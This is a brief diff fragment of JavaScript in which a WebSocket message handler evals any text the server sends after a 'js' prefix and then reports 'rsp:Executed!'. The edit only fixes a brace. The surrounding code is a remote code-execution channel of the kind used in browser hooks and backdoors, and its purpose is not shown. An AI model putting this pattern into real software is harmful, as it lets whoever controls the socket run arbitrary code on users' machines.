@@ -13,6 +13,5 @@ ws.onmessage = function (event) {
   if(data.substr(0, 2)=="js") {
      eval(data.substr(3, data.length));
      ws.send('rsp:Executed!')
-  } 
   }
 }
